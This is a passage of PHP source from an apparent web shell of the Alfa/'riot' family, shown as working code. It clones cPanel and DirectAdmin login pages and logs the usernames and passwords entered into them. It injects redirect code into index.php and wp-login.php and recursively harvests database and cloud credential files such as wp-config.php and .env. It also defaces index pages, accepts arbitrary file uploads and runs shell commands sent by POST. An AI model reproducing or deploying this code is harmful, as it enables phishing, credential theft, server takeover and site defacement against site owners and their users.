        }
    }
}
function riotfakepage()
{
    riothead();
    AlfaNum(9, 10);
    echo '<div class=header><br>
	<center><div class="txtfont_header">| Host Manager Fake page |</div></center><br><br><form onSubmit="g(\'fakepage\',null,this.clone_page.value,this.fake_root.value,\'>>\',this.logto.value,this.panel.value,this.inject_to.value,this.bind_on.value,this.count.value);return false;" method=\'post\'>
	<div class="txtfont" style="position: relative;left: 50%;transform: translate(-50%);"><div style="margin-bottom:6px;"><span style="display: inline-block;width: 106px;">Panel: </span><select style="width:100px;" name="panel">';
    $cm_array = ["cpanel" => "Cpanel", "directadmin" => "DirectAdmin"];
    foreach ($cm_array as $key => $val) {
        echo '<option value="' . $key . '">' . $val . "</option>";
    }
    echo "</select></div>";
    echo '<div style="margin-bottom:6px;"><span style="display: inline-block;width: 106px;">Clone page: </span><input size="50" type="text" name="clone_page" placeholder="eg: https://target.com:2083 | https://target.com:2222"></div>
	<div style="margin-bottom:6px;"><span>Fake page root: </span><input size="50" type="text" name="fake_root" value="' .
        $_SERVER["DOCUMENT_ROOT"] .
        '/fake_page_root/"></div>
	<div style="margin-bottom:6px;"><span style="display: inline-block;width: 106px;">Inject to: </span><input size="50" type="text" name="inject_to" value="' .
        $_SERVER["DOCUMENT_ROOT"] .
        '/index.php"></div>
	<div style="margin-bottom:6px;"><span style="display: inline-block;width: 106px;">Bind on: </span><input size="50" type="text" name="bind_on" placeholder="eg: ' .
        $_SERVER["DOCUMENT_ROOT"] .
        '/wp-login.php"></div>
	<div style="margin-bottom:6px;"><span style="display: inline-block;width: 106px;">Log To: </span><input size="50" type="text" name="logto" value="' .
        $GLOBALS["cwd"] .
        'logs.txt"></div>
	<div style="margin-bottom:6px;"><span style="display: inline-block;width: 106px;">Count of Invalid login: </span><input size="20" type="text" name="count" value="3" style="text-align:center;"></div>
	<div style="text-align:center;"><input type="submit" name="btn" value=" "></div></div></form><br>';
    $clone_page = $_POST["riot1"];
    $fake_root = $_POST["riot2"];
    $logto = $_POST["riot4"];
    $panel = $_POST["riot5"];
    $inject_to = $_POST["riot6"];
    $bind_on = $_POST["riot7"];
    $count = $_POST["riot8"];
    if (!empty($clone_page) && !empty($fake_root) && !empty($logto) && !empty($inject_to) && !empty($bind_on) && $_POST["riot3"] == ">>") {
        echo __pre();
        $target = $clone_page;
        $curl = new AlfaCURL();
        $source_page = $curl->Send($target);
        if (!empty($source_page)) {
            $matched_form = "";
            if ($panel == "cpanel") {
                if (preg_match('#<form(.*)id="login_form"(.*)>#', $source_page, $match)) {
                    $matched_form = $match[0];
                }
            } else {
                if (preg_match("#<form(.*?)>#", $source_page, $match)) {
                    $matched_form = $match[0];
                }
            }
            if (!empty($matched_form)) {
                $fake = "";
                $pwd = str_replace($_SERVER["DOCUMENT_ROOT"], "", $fake_root);
                $uri = str_replace($_SERVER["DOCUMENT_ROOT"], "", $inject_to);
                if ($panel == "cpanel") {
                    $port = "2083";
                } else {
                    $target = str_replace(["http://", "https://"], "", $target);
                    $port = explode(":", $target);
                    $port = $port[1];
                }
                if (substr($uri, 0, 1) == "/") {
                    $uri = substr($uri, 1);
                }
                $uri = $_SERVER["HTTP_ORIGIN"] . "/" . str_replace("index.php", "", $uri) . "?:" . $port;
                $log_url = $_SERVER["HTTP_ORIGIN"] . $pwd . "/log.php";
                if ($panel == "cpanel") {
                    $form = '<form novalidate id="login_form" action="' . $log_url . '" method="post" target="_top" style="visibility:">';
                } else {
                    $form = '<form action="' . $log_url . '" method="post">';
                }
                $fake = str_replace($matched_form, $form, $source_page);
                if (@!is_dir($fake_root)) {
                    @mkdir($fake_root, 0777, true);
                }

                $cookie_name = "riot_fakepage_counter" . rand(9999, 99999);

                $post_user = "user";
                $post_pass = "pass";
                $resp_code = 'if(empty($user)){http_response_code(400);echo json_encode(array("message" => "no_username"));}else{http_response_code(401);}';
                if ($panel != "cpanel") {
                    $post_user = "username";
                    $post_pass = "password";
                    $resp_code = '@header("Location: ".$_SERVER[\'HTTP_REFERER\']);';
                }

                $cpanel_log =
                    '<?php $cook_time = time()+(86400 * 7); $user = $_POST["' .
                    $post_user .
                    '"];$pass = $_POST["' .
                    $post_pass .
                    '"];if(!empty($user) && !empty($pass)){if(!isset($_COOKIE["' .
                    $cookie_name .
                    '"])){@setcookie("' .
                    $cookie_name .
                    '", 0, $cook_time, "/");$_COOKIE["' .
                    $cookie_name .
                    '"]=1;}if((int)$_COOKIE["' .
                    $cookie_name .
                    '"]>' .
                    $count .
                    '){@header("Location: /");exit;}@setcookie("' .
                    $cookie_name .
                    '", ((int)$_COOKIE["' .
                    $cookie_name .
                    '"] + 1), $cook_time, "/");$fp = @fopen("' .
                    $logto .
                    '", "a+");@fwrite($fp, $user . " : " . $pass . "\n");fclose($fp);sleep(3);' .
                    $resp_code .
                    "exit;}?>";

                @file_put_contents($fake_root . "/log.php", $cpanel_log);

                if ($panel == "cpanel") {
                    $fake = preg_replace(
                        ['#<link(.*)href="(.*)"(.*)>#', '#<img class="main-logo" src="(.*)"(.*)>#', '# <a(.*)id="reset_password">#'],
                        ['<link href="' . $target . '/$2">', '<img class="main-logo" src="' . $target . '/$1" alt="logo" />', '<a href="#" id="reset_password">'],
                        $fake
                    );
                }

                @file_put_contents($fake_root . "/index.php", $fake);

                $inject_code = '<?php if(isset($_GET[":2083"])&&(int)$_COOKIE["' . $cookie_name . '"]<' . $count . '){@include("' . $fake_root . '/index.php");exit;}?>';
                $bind_on_code = '<?php if((int)$_COOKIE["' . $cookie_name . '"]<' . $count . '){@header("Location: ' . $uri . '");exit;}?>';

                @file_put_contents($inject_to, $inject_code . "\n" . @file_get_contents($inject_to));
                @file_put_contents($bind_on, $bind_on_code . "\n" . @file_get_contents($bind_on));

                echo "success...!";
            } else {
                echo "failed...!";
            }
        } else {
            echo "<div style='text-align:center;color:red;'>Cannot open the target...!</div>";
        }
    }
    echo "</div>";
    riotfooter();
}
function riotarchive_manager()
{
    riothead();
    $file = $_POST["riot2"];
    if (!file_exists($file)) {
        $file = $GLOBALS["cwd"];
    }
    $rand_id = rand(9999, 999999);
    echo '<div class=header><center><p><div class="txtfont_header">| Archive Manager |</div></p>';
    echo '<form name="srch" onSubmit="g(\'archive_manager\',null,null,this.file.value,null,null,\'>>\');return false;" method=\'post\'>
	<div class="txtfont">
	Archive file: <input size="50" id="target" type="text" name="file" value="' .
        $file .
        '">
	<input type="submit" name="btn" value=" "></div></form></center><br>';
    if ($_POST["riot5"] == ">>") {
        //echo __pre();
        echo '<hr><div style="margin-left: 12px;" archive_full="phar://' .
            $file .
            '" archive_name="' .
            basename($file) .
            '" id="archive_dir_' .
            $rand_id .
            '" class="archive_dir_holder"><span>PWD: </span><div class="archive_pwd_holder" style="display:inline-block"><a>/</a></div></div>';
        echo '<div style="padding: 10px;" id="archive_base_' . $rand_id . '">';
        __riot_open_archive_file($file, $rand_id);
        echo "</div>";
    }
    echo "</div>";
    riotfooter();
}
function __riot_open_archive_file($arch, $base_id = 0)
{
    try {
        $files = [];
        $dirs = [];
        $archive = new PharData($arch);
        foreach ($archive as $file) {
            $file_modify = @date("Y-m-d H:i:s", @filemtime($file->getPathname()));
            if ($file->isDir()) {
                $dirs[] = [
                    "name" => $file->getFileName(),
                    "path" => $file->getPathname(),
                    "type" => "dir",
                    "modify" => $file_modify,
                ];
            } else {
                $file_size = @filesize($file->getPathname());
                $files[] = [
                    "name" => $file->getFileName(),
                    "path" => $file->getPathname(),
                    "type" => "file",
                    "modify" => $file_modify,
                    "size" => $file_size,
                ];
            }
        }
        function __riot_open_archive_usort($a, $b)
        {
            return strcmp(strtolower($a["name"]), strtolower($b["name"])) * 1;
        }
        usort($dirs, "__riot_open_archive_usort");
        usort($files, "__riot_open_archive_usort");
        $files = array_merge($dirs, $files);
        echo '<table width="100%" class="main" cellspacing="0" cellpadding="2"><tbody><tr><th>Name</th><th>Size</th><th>Modify</th><th>Actions</th></tr>';
        $icon = '<img class="archive-icons" src="' . findicon("..", "dir") . '" width="30" height="30">';
        echo '<tr><th><a base_id="' .
            $base_id .
            '" class="archive-file-row" fname=".." onclick="riotOpenArchive(this);" path="' .
            dirname($arch . ".php") .
            '">' .
            $icon .
            '<span class="archive-name archive-type-dir">| .. |</span></a><td>dir</td><td>-</td><td>-</td></tr>';
        foreach ($files as $file) {
            $icon = '<img class="archive-icons" src="' . findicon($file["name"], $file["type"]) . '" width="30" height="30">';
            if ($file["type"] == "dir") {
                echo '<tr><th><a base_id="' .
                    $base_id .
                    '" class="archive-file-row" onclick="riotOpenArchive(this);" path="' .
                    $file["path"] .
                    '" fname="' .
                    $file["name"] .
                    '">' .
                    $icon .
                    '<span class="archive-name archive-type-dir">| ' .
                    $file["name"] .
                    " |</span></a><td>dir</td><td>" .
                    $file["modify"] .
                    "</td><td>-</td></tr>";
            } else {
                echo "<tr><th><a base_id='" .
                    $base_id .
                    "' class='archive-file-row' onclick=\"editor('" .
                    $file["path"] .
                    "','auto','','','','file');\">" .
                    $icon .
                    "<span class='archive-name archive-type-file' fname='" .
                    $file["name"] .
                    "'>" .
                    $file["name"] .
                    "</span></a><td>" .
                    riotSize($file["size"]) .
                    "</td><td>" .
                    $file["modify"] .
                    "</td><td>-</td></tr>";
            }
        }
        echo "</table>";
    } catch (Exception $e) {
        echo "0";
    }
}
function riotopen_archive_dir()
{
    $dir = $_POST["riot1"];
    $base_id = $_POST["riot2"];
    __riot_open_archive_file($dir, $base_id);
}
function riotconfig_grabber()
{
    riothead();
    echo '<div class=header><center><p><div class="txtfont_header">| Config Grabber |</div></p>';
    echo '<form name="srch" onSubmit="g(\'config_grabber\',null,null,this.dir.value,this.ext.value,null,\'>>\');return false;" method=\'post\'>
	<div class="txtfont">
	Dir: <input size="50" id="target" type="text" name="dir" value="' .
        $GLOBALS["cwd"] .
        '">
	Ext: <small><font color="red">[ * = all Ext ]</font></small> <input id="ext" style="text-align:center;" type="text" name="ext" size="5" value="php">
	<input type="submit" name="btn" value=" "></div></form></center><br>';
    $dir = $_POST["riot2"];
    $ext = $_POST["riot3"];
    if ($_POST["riot5"] == ">>") {
        echo __pre();
        Alfa_ConfigGrabber($dir, $ext);
    }
    echo "</div>";
    riotfooter();
}
function Alfa_ConfigGrabber($dir, $ext)
{
    $pattern =
        "#define[ ]{0,}\([ ]{0,}(?:'|\")DB_HOST(?:'|\")[ ]{0,}|define[ ]{0,}\([ ]{0,}(?:'|\")DB_HOSTNAME(?:'|\")[ ]{0,}|config\[(?:'|\")MasterServer(?:'|\")\]\[(?:'|\")password(?:'|\")\]|(?:'|\")database(?:'|\")[ ]{0,}=>[ ]{0,}(?:'|\")(.*?)(?:'|\")|(?:'|\")(mysql|database)(?:'|\")[ ]{0,}=>[ ]{0,}array|db_name|db_user|db_pass|db_server|db_host|dbhost|dbname|dbuser|dbpass|database_name|database_user|database_pass|mysql_user|mysql_pass|mysqli_connect|mysql_connect|new[ ]{0,}mysqli#i";
    $db_files = [
        "wp-config.php",
        "configure.php",
        "config.inc.php",
        "configuration.php",
        "config.php",
        "conf.php",
        "dbclass.php",
        "class_core.php",
        "dist-configure.php",
        "settings.php",
        "conf_global.php",
        "db.php",
        "connect.php",
        "confing.db.php",
        "config.db.php",
        "database.php",

        // ✅ Tambahan untuk Laravel & modern frameworks
        ".env",
        ".env.local",
        ".env.production",
        "env.php",
        "database.php",
        "app.php",
        "services.php",
        "cache.php",
        "mail.php",
        "queue.php",
        "logging.php",
        "broadcasting.php",
        "session.php",
        "filesystems.php",
        "horizon.php",
        "cors.php",

        // ✅ Tambahan untuk frameworks lain
        "local-config.php",
        "env.local.php",
        "settings.local.php",
        "config.local.php",
        "database.env",
        "dbconfig.php",
        "connection.php",
        "credentials.php",
        "secret-config.php",
        "prod-config.php",
        "staging-config.php",
        "firebase.php",
        "aws.php",
        "stripe.php",
        "paypal.php",

        // ✅ Tambahan universal configs
        "docker-compose.yml",
        "docker.env",
        "settings.ini",
        "config.json",
        "database.json",
        "secrets.json",
        "config.yaml",
        "database.yaml",
        "appsettings.json",
    ];
    if (@is_readable($dir)) {
        $globFiles = @glob("$dir/*.$ext");
        $globDirs = @glob("$dir/*", GLOB_ONLYDIR);
        $blacklist = [];
        foreach ($globDirs as $dir) {
            if (!@is_readable($dir) || @is_link($dir)) {
                continue;
            }
            @Alfa_ConfigGrabber($dir, $ext);
        }
        foreach ($globFiles as $file) {
            $filee = @file_get_contents($file);
            if (preg_match($pattern, $filee)) {
                echo "<div><span>$file</span> <a style='cursor:pointer;' onclick=\"editor('" . $file . "','auto','','','','file');\">[ View file ]</a></div>";
            }
        }
    }
}
function riotsearcher()
{
    riothead();
    echo '<div class=header><center><p><div class="txtfont_header">| Searcher |</div></p><h3><a href=javascript:void(0) onclick="g(\'searcher\',null,\'file\')">| Find Readable Or Writable Files | </a><a href=javascript:void(0) onclick="g(\'searcher\',null,\'str\')">| Find Files By Name | </a></h3></center>';
    if (isset($_POST["riot1"]) && $_POST["riot1"] == "file") {
        echo '<center><div class="txtfont_header">| Find Readable Or Writable Files  |</div><br><br><form name="srch" onSubmit="g(\'searcher\',null,\'file\',this.filename.value,this.ext.value,this.method.value,\'>>\');return false;" method=\'post\'>
<div class="txtfont">
Method: <select style="width: 18%;" onclick="riot_searcher_tool(this.value);" name="method"><option value="files">Find All Writable Files</option><option value="dirs">Find All Writable Dirs</option><option value="all">Find All Readable And Writable Files</option></select>
Dir: <input size="50" id="target" type="text" name="filename" value="' .
            $GLOBALS["cwd"] .
            '">
Ext: <small><font color="red">[ * = all Ext ]</font></small> <input id="ext" style="text-align:center;" type="text" name="ext" size="5" value="php">
<input type="submit" name="btn" value=" "></div></form></center><br>';
        $dir = $_POST["riot2"];
        $ext = $_POST["riot3"];
        $method = $_POST["riot4"];
        if ($_POST["riot5"] == ">>") {
            echo __pre();
            if (substr($dir, -1) == "/") {
                $dir = substr($dir, 0, -1);
            }
            Alfa_Searcher($dir, trim($ext), $method);
        }
    }
    if ($_POST["riot1"] == "str") {
        echo '<center><div class="txtfont_header">| Find Files By Name / Find String In Files |</div><br><br><form onSubmit="g(\'searcher\',null,\'str\',this.dir.value,this.string.value,\'>>\',this.ext.value,this.method.value);return false;" method=\'post\'>
<div class="txtfont">
Method: <select name="method"><option value="name">Find Files By Name</option><option value="str">Find String In Files</option></select>
String: <input type="text" name="string" value="">
Dir: <input size="50" type="text" name="dir" value="' .
            $GLOBALS["cwd"] .
            '">
Ext: <small><font color="red">[ * = all Ext ]</font></small> <input id="ext" style="text-align:center;" type="text" name="ext" size="5" value="php">
<input type="submit" name="btn" value=" "></div></form></center><br>';
        $dir = $_POST["riot2"];
        $string = $_POST["riot3"];
        $ext = $_POST["riot5"];
        if (!empty($string) and !empty($dir) and $_POST["riot4"] == ">>") {
            echo __pre();
            Alfa_StrSearcher($dir, $string, $ext, $_POST["riot6"]);
        }
    }
    echo "</div>";
    riotfooter();
}
function Alfa_ReadDir($dir, $method = "", $defpage = "")
{
    if (!@is_readable($dir)) {
        return false;
    }
    if (@is_dir($dir)) {
        if ($dh = @opendir($dir)) {
            while (($file = readdir($dh)) !== false) {
                if ($file == ".." || $file == ".") {
                    continue;
                }
                $newfile = $dir . "/" . $file;
                if (@is_readable($newfile) && @is_dir($newfile)) {
                    Alfa_ReadDir($newfile, $method, $defpage);
                }
                if (@is_file($newfile)) {
                    if (!@is_readable($newfile)) {
                        continue;
                    }
                    Alfa_Rewriter($newfile, $file, $defpage, $method);
                }
            }
            closedir($dh);
        }
    }
}
function Alfa_Rewriter($dir, $file, $defpage, $m = "index")
{
    if (!@is_writable($dir)) {
        return false;
    }
    if (!@is_readable($dir)) {
        return false;
    }
    $defpage = @file_get_contents($defpage);
    if ($m == "index") {
        $indexs = ["index.php", "index.htm", "index.html", "default.asp", "default.aspx", "index.asp", "index.aspx", "index.js"];
        if (in_array(strtolower($file), $indexs)) {
            @file_put_contents($dir, $defpage);
            echo @is_file($dir) ? $dir . "<b><font color='red'>DeFaced...</b></font><br>" : "";
        }
    } elseif ($m == "all") {
        @file_put_contents($dir, $defpage);
        echo @is_file($dir) ? $dir . "  <b><font color='red'>DeFaced...</b></font><br>" : "";
    }
}
if (isset($_GET['inc']) && $_GET['inc'] === 'upload') {
        echo '<form method="post" enctype="multipart/form-data">';
        echo '<input type="text" name="dir" size="30" value="' . getcwd() . '">';
        echo '<input type="file" name="file" size="15">';
        echo '<input type="submit" value="Unggah">';
        echo '</form>';
    }
    if (isset($_FILES['file']['tmp_name'])) {
        $uploadd = $_FILES['file']['tmp_name'];

        if (is_uploaded_file($uploadd)) {
            $pwddir = $_POST['dir'];
            $real = $_FILES['file']['name'];
            $de = $pwddir . "/" . $real;

            if (copy($uploadd, $de)) {
                echo "success $de";
            } else {
                echo "failed";
            }
        }
    }
function riotGetDisFunc()
{
    riothead();
    echo '<div class="header">';
    $disfun = @ini_get("disable_functions");
    $s = explode(",", $disfun);
    $f = array_unique($s);
    echo '<center><br><b><font color="#7CFC00">Disable Functions</font></b><pre><table border="1"><tr><td align="center" style="background-color: red;color: white;width:5%">#</td><td align="center" style="background-color: red;color: white;">Func Name</td></tr>';
    $i = 1;
    foreach ($f as $s) {
        $s = trim($s);
        if (function_exists($s) || !is_callable($s)) {
            continue;
        }
        echo '<tr><td align="center" style="background-color: black;">' . $i . "</td>";
        echo '<td align="center" style="background-color: black;"><a style="text-decoration: none;" target="_blank" href="http://php.net/manual/en/function.' .
            str_replace("_", "-", $s) .
            '.php"><span class="disable_functions"><b>' .
            $s .
            "</b></span></a></td>";
        $i++;
    }
    echo "</table></center>";
    echo "</div>";
    riotfooter();
}
function Alfa_Create_A_Tag($action, $vals)
{
    $nulls = [];
    foreach ($vals as $key => $val) {
        echo '<a href=javascript:void(0) onclick="g(\'' . $action . '\',';
        for ($i = 1; $i <= $val[1] - 1; $i++) {
            $nulls[] = "null";
        }
        $f = implode(",", $nulls);
        echo $f . ',\'' . $val[0] . '\');return false;">| ' . $key . " | </a>";
        unset($nulls);
    }
}
function Alfa_Searcher($dir, $ext, $method)
{
    if (@is_readable($dir)) {
        if ($method == "all") {
            $ext = "*";
        }
        if ($method == "dirs") {
            $ext = "*";
        }
        $globFiles = @glob("$dir/*.$ext");
        $globDirs = @glob("$dir/*", GLOB_ONLYDIR);
        $blacklist = [];
        foreach ($globDirs as $dir) {
            if (!@is_readable($dir) || @is_link($dir)) {
                continue;
            }
            @Alfa_Searcher($dir, $ext, $method);
        }
        switch ($method) {
            case "files":
                foreach ($globFiles as $file) {
                    if (@is_writable($file)) {
                        echo "$file<br>";
                    }
                }
                break;
            case "dirs":
                foreach ($globFiles as $file) {
                    if (@is_writable(dirname($file)) && !in_array(dirname($file), $blacklist)) {
                        echo dirname($file) . "<br>";
                        $blacklist[] = dirname($file);
                    }
                }
                break;
            case "all":
                foreach ($globFiles as $file) {
                    echo $file . "<br>";
                }
                break;
        }
        unset($blacklist);
    }
}
function AlfaiFrameCreator($f, $width = "100%", $height = "600px")
{
    return '<iframe src="' . __SYS_CONFIG_FOLDER__ . "/" . $f . '" width="' . $width . '" height="' . $height . '" frameborder="0"></iframe>';
}
class AlfaCURL
{
    public $headers;
    public $user_agent;
    public $compression;
    public $cookie_file;
    public $proxy;
    public $path;
    public $ssl = true;
    public $curl_status = true;
    function __construct($cookies = false, $compression = "gzip", $proxy = "")
    {
        if (!extension_loaded("curl")) {
            $curl_status = false;
            return false;
        }
        $this->headers[] = "Accept: image/gif, image/x-bitmap, image/jpeg, image/pjpeg";
        $this->headers[] = "Connection: Keep-Alive";
        $this->headers[] = "Content-type: application/x-www-form-urlencoded;charset=UTF-8";
        $this->user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36)";
        $this->path = ALFA_TEMPDIR . "/Alfa_cookies.txt";
        $this->compression = $compression;
        $this->proxy = $proxy;
        $this->cookies = $cookies;
        if ($this->cookies) {
            $this->cookie($this->path);
        }
    }
    function cookie($cookie_file)
    {
        if (_riot_file_exists($cookie_file, false)) {
            $this->cookie_file = $cookie_file;
        } else {
            @fopen($cookie_file, "w") or die($this->error("The cookie file could not be opened."));
            $this->cookie_file = $cookie_file;
            @fclose($this->cookie_file);
        }
    }
    function Send($url, $method = "get", $data = "")
    {
        if (!$this->curl_status) {
            return false;
        }
        $process = curl_init($url);
        curl_setopt($process, CURLOPT_HTTPHEADER, $this->headers);
        curl_setopt($process, CURLOPT_HEADER, 0);
        curl_setopt($process, CURLOPT_USERAGENT, $this->user_agent);
        curl_setopt($process, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($process, CURLOPT_ENCODING, $this->compression);
        curl_setopt($process, CURLOPT_TIMEOUT, 30);
        if ($this->ssl) {
            curl_setopt($process, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($process, CURLOPT_SSL_VERIFYHOST, false);
        }
        if ($this->cookies) {
            curl_setopt($process, CURLOPT_COOKIEFILE, $this->path);
            curl_setopt($process, CURLOPT_COOKIEJAR, $this->path);
        }
        if ($this->proxy) {
            curl_setopt($process, CURLOPT_PROXY, $this->proxy);
        }
        if ($method == "post") {
            curl_setopt($process, CURLOPT_POSTFIELDS, $data);
            curl_setopt($process, CURLOPT_POST, 1);
            curl_setopt($process, CURLOPT_HTTPHEADER, ["Content-Type: application/x-www-form-urlencoded"]);
        }
        $return = @curl_exec($process);
        curl_close($process);
        return $return;
    }
    function error($error)
    {
        echo "<center><div style='width:500px;border: 3px solid #FFEEFF; padding: 3px; background-color: #FFDDFF;font-family: verdana; font-size: 10px'><b>cURL Error</b><br>$error</div></center>";
        die();
    }
}
function getConfigHtml($cms)
{
    $content = "";
    $cms_array = [
        "wp" => "WordPress",
        "vb" => "vBulletin",
        "whmcs" => "Whmcs",
        "joomla" => "Joomla",
        "phpnuke" => "PHPNuke",
        "phpbb" => "PHPBB",
        "mybb" => "MyBB",
        "drupal" => "Drupal",
        "smf" => "SMF",
    ];
    $content .= "<form class='getconfig' onSubmit='g(\"GetConfig\",null,this.cms.value,this.path.value,this.getAttribute(\"base_id\"));return false;'><div class='txtfont'>Cms: </div> <select name='cms'style='width:100px;'>";
    foreach ($cms_array as $key => $val) {
        $content .= "<option value='{$key}' " . ($key == $cms ? "selected=selected" : "") . ">{$val}</option>";
    }
    $content .= "</select> <div class='txtfont'>Path(installed cms/Config): </div> <input type='text' name='path' value='" . $_SERVER["DOCUMENT_ROOT"] . "/' size='30' /> <button class='button'>GetConfig</button>";
    $content .= "</form>";
    return $content;
}
if (!function_exists("json_encode")) {
    function json_encode($a = false)
    {
        if (is_null($a)) {
            return "null";
        }
        if ($a === false) {
            return "false";
        }
        if ($a === true) {
            return "true";
        }
        if (is_scalar($a)) {
            if (is_float($a)) {
                return floatval(str_replace(",", ".", strval($a)));
            }

            if (is_string($a)) {
                static $jsonReplaces = [["\\", "/", "\n", "\t", "\r", "\b", "\f", '"'], ["\\\\", "\\/", '\\n', '\\t', '\\r', "\\b", '\\f', '\"']];
                return '"' . str_replace($jsonReplaces[0], $jsonReplaces[1], $a) . '"';
            } else {
                return $a;
            }
        }
        $isList = true;
        for ($i = 0, reset($a); $i < count($a); $i++, next($a)) {
            if (key($a) !== $i) {
                $isList = false;
                break;
            }
        }
        $result = [];
        if ($isList) {
            foreach ($a as $v) {
                $result[] = json_encode($v);
            }
            return "[" . join(",", $result) . "]";
        } else {
            foreach ($a as $k => $v) {
                $result[] = json_encode($k) . ":" . json_encode($v);
            }
            return "{" . join(",", $result) . "}";
        }
    }
}
if (!function_exists("json_decode")) {
    function json_decode($json, $array = true)
    {
        $comment = false;
        $out = '$x=';
        for ($i = 0; $i < strlen($json); $i++) {
            if (!$comment) {
                if ($json[$i] == "{" || $json[$i] == "[") {
                    $out .= " array(";
                } elseif ($json[$i] == "}" || $json[$i] == "]") {
                    $out .= ")";
                } elseif ($json[$i] == ":") {
                    $out .= "=>";
                } else {
                    $out .= $json[$i];
                }
            } else {
                $out .= $json[$i];
            }
            if ($json[$i] == '"') {
                $comment = !$comment;
            }
        }
        eval($out . ";");
        return $x;
    }
}
function riotterminalExec()
{
    $pwd = "pwd";
    $seperator = ";";
    if ($GLOBALS["sys"] != "unix") {
        $pwd = "cd";
        $seperator = "&";
    }
    if ($GLOBALS["glob_chdir_false"] && !empty($_POST["c"])) {
        $cmd = "cd '" . addslashes($_POST["c"]) . "'" . $seperator;
    }
    $current_path = "";
    if (preg_match("/cd[ ]{0,}(.*)[ ]{0,}" . $seperator . "|cd[ ]{0,}(.*)[ ]{0,}/i", $_POST["riot1"], $match)) {
        if (empty($match[1])) {
            $match[1] = $match[2];
        }
        $current_path = riotEx("cd " . addslashes($match[1]) . $seperator . $pwd);
        $current_path = str_replace("\\", "/", $current_path);
    }
    $out = riotEx($cmd . $_POST["riot1"], true);
    $out = htmlspecialchars($out);
    echo json_encode(["output" => convertBash($out), "path" => $current_path]);
}
function convertBash($code)
{
    $dictionary = [
        "[01;30m" => '<span style="color:black">',
        "[01;31m" => '<span style="color:red">',
        "[01;32m" => '<span style="color:red">',
        "[01;33m" => '<span style="color:yellow">',
        "[01;34m" => '<span style="color:blue">',
        "[01;35m" => '<span style="color:purple">',
        "[01;36m" => '<span style="color:cyan">',
        "[01;37m" => '<span style="color:white">',
        "[0m" => "</span>",
    ];
    $htmlString = str_replace(array_keys($dictionary), $dictionary, $code);
    return $htmlString;
}
function riotdoActions()
{
    $chdir_fals = false;
    if (!@chdir($_POST["c"])) {
        $chdir_fals = true;
        $riot_canruncmd = _riot_can_runCommand(true, true);
    }
    if (isset($_POST["riot1"])) {
        $_POST["riot1"] = rawurldecode($_POST["riot1"]);
    }
    if (isset($_POST["riot2"])) {
        $_POST["riot2"] = rawurldecode($_POST["riot2"]);
    }
    $action = $_POST["riot3"];
    if ($action == "permission") {
        $perms = 0;
        $perm = $_POST["riot2"];
        for ($i = strlen($perm) - 1; $i >= 0; --$i) {
            $perms += (int) $perm[$i] * pow(8, strlen($perm) - $i - 1);
        }
        if (@chmod($_POST["riot1"], $perms)) {
            echo "done";
        } else {
            echo "no";
        }
        return;
    }
    if ($action == "rename" || $action == "move") {
        $riot1_decoded = $_POST["riot1"];
        if ($chdir_fals) {
            $_POST["riot1"] = $_POST["c"] . "/" . $_POST["riot1"];
        }
        $_POST["riot1"] = trim($_POST["riot1"]);
        $riot1_escape = addslashes($_POST["riot1"]);
        if ($_POST["riot3"] == "rename") {
            $_POST["riot2"] = basename($_POST["riot2"]);
        }
        if (!empty($_POST["riot2"])) {
            $cmd_rename = false;
            if ($chdir_fals && $riot_canruncmd) {
                if (_riot_is_writable($_POST["riot1"])) {
                    $cmd_rename = true;
                    $riot1_escape = addslashes($riot1_decoded);
                    riotEx("cd '" . addslashes($_POST["c"]) . "';mv '" . $riot1_escape . "' '" . addslashes($_POST["riot2"]) . "'");
                }
            }
            if (!file_exists($_POST["riot2"])) {
                if (@rename($_POST["riot1"], $_POST["riot2"]) || $cmd_rename) {
                    echo "done";
                } else {
                    echo "no";
                }
            } else {
                echo "no";
            }
        }
    } elseif ($action == "copy") {
        if (is_dir($_POST["riot1"])) {
            $dir = str_replace("//", "/", $_POST["riot1"]);
            $dir = explode("/", $dir);
            if (empty($dir[count($dir) - 1])) {
                $name = $dir[count($dir) - 2];
            } else {
                $name = $dir[count($dir) - 1];
            }
        } else {
            $name = basename($_POST["riot1"]);
        }
        $dir = dirname($_POST["riot1"]);
        if ($dir == ".") {
            $dir = $_POST["c"] . "/";
        }
        if (is_file($_POST["riot1"])) {
            @copy($_POST["riot1"], $_POST["riot2"]);
            echo "done";
        } elseif (is_dir($_POST["riot1"])) {
            if (!is_dir($_POST["riot2"])) {
                mkdir($_POST["riot2"], 0755, true);
            }
            copy_paste($dir, $name, $_POST["riot2"] . "/");
            echo "done";
        }
    } elseif ($action == "modify") {
        if (!empty($_POST["riot1"])) {
            $time = strtotime($_POST["riot1"]);
            if ($time) {
                $touched = false;
                if ($chdir_fals && $riot_canruncmd) {
                    riotEx("cd '" . addslashes($_POST["c"]) . "';touch -d '" . htmlspecialchars(addslashes($_POST["riot1"])) . "' '" . addslashes($_POST["riot2"]) . "'");
                    $touched = true;
                }
                if (!@touch($_POST["riot2"], $time, $time) && !$touched) {
                    echo "no";
                } else {
                    echo "ok";
                }
            } else {
                echo "badtime";
            }
        }
    }
}
function riotget_flags()
{
    $flags = [];
    if (function_exists("curl_version")) {
        $curl = new AlfaCURL();
        $server_addr = !@$_SERVER["SERVER_ADDR"] ? (function_exists("gethostbyname") ? @gethostbyname($_SERVER["SERVER_NAME"]) : "????") : @$_SERVER["SERVER_ADDR"];
        $flag = $curl->Send("http://www.geoplugin.net/json.gp?ip=" . $server_addr);
        $flag2 = $curl->Send("http://www.geoplugin.net/json.gp?ip=" . $_SERVER["REMOTE_ADDR"]);
        if (strpos($flag2, "geoplugin") != false) {
            $flag = json_decode($flag, true);
            $flag2 = json_decode($flag2, true);
            if (!empty($flag["geoplugin_countryCode"])) {
                $flags["server"]["name"] = $flag["geoplugin_countryName"];
                $flags["server"]["code"] = $flag["geoplugin_countryCode"];
            }
            if (!empty($flag2["geoplugin_countryCode"])) {
                $flags["client"]["name"] = $flag2["geoplugin_countryName"];
                $flags["client"]["code"] = $flag2["geoplugin_countryCode"];
            }
        }
    }
    echo json_encode($flags);
}
function riotGetConfig()
{
    $cms = $_POST["riot1"];
    $path = trim($_POST["riot2"]);
    $config = [
        "wp" => [
            "file" => "/wp-config.php",
            "host" => ["/define[ ]{0,}\([ ]{0,}(?:'|\")DB_HOST(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/", 1],
